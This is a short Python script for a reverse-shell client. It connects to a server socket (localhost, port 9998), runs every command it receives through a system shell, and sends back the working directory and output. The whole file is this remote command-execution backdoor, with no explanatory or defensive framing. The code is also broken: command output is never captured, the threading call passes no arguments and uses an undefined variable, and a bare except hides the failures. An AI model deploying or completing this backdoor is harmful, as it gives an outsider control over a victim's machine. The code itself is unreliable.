import os, subprocess
import socket
import time
import threading

host = "localhost"
port = 9998

client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_sock.connect((host, port))
response = os.getcwd()+">"
client_sock.send(response.encode())

def exec_and_send(data):
    p = subprocess.Popen(data, shell=True)
    output, error = p.communicate()
    print(output.decode())
    client_sock.send(output)
    response = os.getcwd() + ">"
    client_sock.send(response.encode())

while True:
    try:
        msg_from_srv = client_sock.recv(1024)
        exec_and_send(msg_from_srv)
        thread = threading.Thread(target=exec_and_send(), args=(data,))
        thread.start()
    except:
        time.sleep(5)
        continue
